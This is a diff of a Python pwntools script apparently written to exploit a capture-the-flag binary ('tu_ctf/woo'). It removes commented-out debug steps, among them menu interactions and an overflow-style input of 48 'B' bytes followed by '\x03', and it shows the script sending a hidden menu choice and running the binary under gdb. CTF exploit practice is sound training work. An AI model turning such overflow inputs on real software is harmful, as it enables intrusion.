@@ -15,8 +15,6 @@ if not debug:
 		print p.recvuntil('choice:')
 		p.sendline('4919')
 
-		# p.sendline('x/30x *0x6020e0')
-
 		p.interactive()
 else:
 	p = process(['gdb', '-q', '/home/nscd/tu_ctf/woo'])
@@ -26,22 +24,6 @@ else:
 	print p.sendline('b *0x400CD9')
 	print p.recvuntil('(gdb)')
 	p.sendline('r')
-
-	# # make bear
-	# print p.recvuntil('choice:')
-	# p.sendline('3') # bear
-	# print p.recvuntil('want:')
-	# p.sendline('2') # type
-	# print p.recvuntil('name:')
-	# p.sendline('AAAA')
-
-	# make tiger
-	# print p.recvuntil('choice:')
-	# p.sendline('2') # tiger
-	# print p.recvuntil('want:')
-	# p.sendline('4') # type
-	# print p.recvuntil('tiger:')
-	# p.sendline('B'*48 + '\x03')
 
 	# make tiger
 	print p.recvuntil('choice:')
